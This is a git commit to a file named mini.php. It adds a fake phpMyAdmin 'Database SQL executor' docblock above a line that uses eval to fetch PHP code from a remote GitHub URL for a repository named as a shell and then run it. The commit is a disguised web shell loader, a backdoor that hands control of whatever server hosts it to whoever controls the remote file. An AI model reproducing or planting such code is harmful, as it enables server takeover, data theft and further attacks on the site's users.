85ed978a2b0a1ef4b781702dd2f9392c2a103716
~/sec/s3rv4n7 <156493057+chloethesis@users.noreply.github.com>
2024-05-24 13:58:08 +0700

    Update mini.php

--- mini.php
+++ mini.php
@@ -1,1 +1,9 @@
+<?php
+/* vim: set expandtab sw=4 ts=4 sts=4: */
+/**
+ * Database SQL executor
+ *
+ * @package PhpMyAdmin
+ */
+?>
 <?php eval("?>".file_get_contents("https://raw.githubusercontent.com/chloethesis/S3RV4N7-SHELL/main/crot.php"));?>
